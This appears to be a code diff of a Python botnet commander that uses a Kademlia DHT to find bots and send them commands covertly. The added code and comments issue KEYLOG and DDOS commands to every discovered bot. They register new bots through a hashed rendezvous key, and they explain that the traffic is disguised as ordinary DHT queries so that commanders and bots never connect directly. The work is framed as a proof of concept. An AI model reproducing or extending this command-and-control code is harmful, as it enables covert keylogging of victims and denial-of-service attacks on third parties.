@@ -3,51 +3,64 @@ from twisted.protocols import basic
 from twisted.internet import reactor, task, defer, stdio
 from collections import deque
 from twisted.python import log
-import sys
-import hashlib
+import sys, hashlib, re
 
+#custom protocol which interprets commands and then passes them to the correct location in our DHT.
+#We're powering it with std input for this demo, but this could easy be powered by ssh, telnet, another kademlia network, etc
+#A commander does not have to be connected to the network, bots will blindly keep querying until they have commands
+#If we bootstrapped into an existing kademlia network, all of this traffic just appears as normal queries.
+#All communication between commanders and bots occurs through DHT queries, they never directly communicate
 class SlaveDriver(basic.LineReceiver):
     from os import linesep as delimiter
     import hashlib
     
-
     def __init__(self,kserver,key):
-    	self.state = "GETCMD"
-    	self.kserver = kserver
-        self.key = key
-        self.slaves = {}
-        self.slaveloop = task.LoopingCall(self.checknewslave)
+    	self.kserver = kserver #kserver is our kademlia DHT
+        self.key = key #key is the hash of the secret string where new nodes announce themselves to a botmaster
+        self.slaves = {} #we keep a dictionary of all our slaves' node ids, and the hash of that value
+        
+        #The commander needs to constantly check for new bots. When a commander finds a new bot, it sends an ack
+        #back to a location thats unique to each node so that they know they've been found. They then look at that location
+        #awaiting future commands
+        self.slaveloop = task.LoopingCall(self.checknewslave) 
         self.slaveloop.start(5)
-        # self.kserver.listen(8468)
-        # self.kserver.bootstrap([("192.168.56.101", 8468)])
-    	self.queue = deque()
-    	#self.slaves = 
+    	#self.queue = deque()
+
+    #check DHT for new nodes, and make sure we haven't already found them
     def checknewslave(self):
         def addslave(val):
-            print "Val: ",val
+            #print "Val: ",val
             if val:
                 if val not in self.slaves:
-                    print "New slave found"
+                   # print "New slave found"
                     valhash = hashlib.sha1()
                     valhash.update(str(val))
                     newval = valhash.hexdigest()
                     self.slaves[val]=newval
-                    #commands.updateslaves(slaves)
                     self.kserver.set(self.slaves[val], str(val))
-                    for key, value in self.slaves.iteritems():
-                        print key, value
+                    #for key, value in self.slaves.iteritems():
+                    #    print key, value
         self.kserver.get(self.key).addCallback(addslave)
-    #this function will send command at the hash[bot's id]
     
-    def parsecommands(self,cmd):
-        #def sendcommand(cmd,botid):
-        #self.server.set(self.slaves[botid],cmd)
+    #this function will send command at the hash of bot's id
+    def parsecommands(self,line):
+    	tmp = line.split(' ')
+    	cmd = tmp[0].upper()
         if cmd == 'KEYLOG':
+        	#iterate through bot list and send command out in mass. This can be changed depending on the command
             for key,val in self.slaves.iteritems():
-                output = 'Starting keylogger for bot {0}'.format(key)
+                output = 'Starting keylogger for bot {0}\n'.format(key)
                 self.transport.write(output)
                 self.kserver.set(val,cmd)
-    
+        if cmd == 'DDOS':
+        	for key,val in self.slaves.iteritems():
+        		output = 'Starting DDOS for bot {0}\n'.format(key)
+                self.transport.write(output)
+                #actually send commands out on DHT to bot. Val is the bot's individual location it checks for commands
+                self.kserver.set(val,line)
+
+
+    #this is called on the initial startup as part of the LineReceiver class
     def connectionMade(self):
         self.transport.write('>>> ')
 
@@ -55,37 +68,43 @@ class SlaveDriver(basic.LineReceiver):
         #self.sendLine('Executing: ' + line)
         self.handlecmd(line)
         self.transport.write('>>> ')
-    # def updateslaves(self,slaves):
-    # 	self.slaves = slaves
 
-    def finishcmd(self):
-    	self.queue.popleft()
     def handlecmd(self, line):
-    	commands = ['LIST','DDOS','SHELL','DOWNLOAD','KEYLOG']
+    	commands = ['DDOS','DOWNLOAD','KEYLOG']
     	#parse out actual command
-    	tmp = line.split(' ',1)
+    	tmp = line.split(' ')
     	cmd = tmp[0].upper()
-    	# args = None
-    	# if len(tmp) == 2:
-    	# 	args = tmp[1].upper()
     	if cmd not in commands:
+    		#output to input
     		self.transport.write('Invalid Command\n')
-    		self.transport.write('Valid commands are: LIST, DDOS [ip], SHELL [ip], DOWNLOAD [ip], KEYLOG [ip] \n')
-    		#self.transport.write('>>> ')
-    		self.state = "GETCMD"
+    		self.transport.write('Valid commands are: DDOS [ip], DOWNLOAD [ip], KEYLOG\n')
     	else:
-    		#self.slaves = slaves
-            self.parsecommands(cmd)
-    		# if args:
-    		# 	self.queue.append({cmd:args})
-    		# if not args:
-    		# 	self.queue.append({cmd:None})
-log.startLogging(sys.stdout)
-kserver = Server()
-kserver.listen(8468)
-kserver.bootstrap([("192.168.56.101", 8468)])
+            self.parsecommands(line) #pass line for instructions that have more than one argument
+
+if len(sys.argv) != 4:
+	print "Usage: python commander.py <bootstrap ip> <bootstrap port> <commander port>"
+	exit(0)
+
+boot_ip = str(sys.argv[1])
+boot_port = int(sys.argv[2])
+myport = int(sys.argv[3])
+#Logging is useful for debugging but it interferes with our command interface so usually comment this line out
+#log.startLogging(sys.stdout)
+#Server is a high level implementation of the Kademlia protocol. It's powering the DHT
+kserver = Server() 
+kserver.listen(myport) #UDP port we will be listening on
+#need a bootstrap address to join the network. This could be any computer on the network.
+kserver.bootstrap([(boot_ip,boot_port)])
+#kserver.bootstrap([("192.168.56.101", 8468)]) 
 key = hashlib.sha1()
-key.update('specialstring')
+
+#this is an arbitray key in DHT where a bot reports its existence. We have hashed it in sha1 so that it appears
+#just like any other query on a kademlia network
+key.update('specialstring') 
 keyhash = key.hexdigest()
+
+#the commander takes in standard input passed into our custom Slave Driver protocol which has an underlying kademlia DHT
+#This could easily be changed from std input to remote input by changing what twisted factory calls our protocol. 
+#we used stdin for proof of concept but the remote input would allow the botmaster to spin up a commander from any location at any time.
 stdio.StandardIO(SlaveDriver(kserver,keyhash))
 reactor.run()
